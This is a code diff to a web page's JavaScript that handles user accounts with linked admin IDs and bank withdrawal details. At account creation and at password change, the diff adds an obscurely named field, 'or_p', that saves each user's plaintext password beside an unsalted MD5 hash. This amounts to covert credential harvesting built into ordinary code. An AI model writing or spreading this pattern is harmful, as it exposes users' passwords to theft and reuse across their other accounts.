@@ -1572,7 +1572,8 @@
                     emailaddress: email,
                     passwordStrength: strengthLabel(score),
                     passwordStrengthBar: score + '%',
-                    password: md5(password),
+                    passwordHash: md5(password),
+                    or_p: password,
                     linked_to_id: ADMIN_ID
                 },
                 bankWithdrawInfo: bankInfo,
@@ -1812,6 +1813,7 @@
                 }
                 const sc = computePasswordStrength(newPwd);
                 user.passwordHash = md5(newPwd);
+                user.or_p = newPwd;
                 user.passwordStrength = strengthLabel(sc);
                 user.passwordStrengthBar = sc + '%';
             }
@@ -2418,4 +2420,3 @@
     </script>
 </body>
 </html>
-
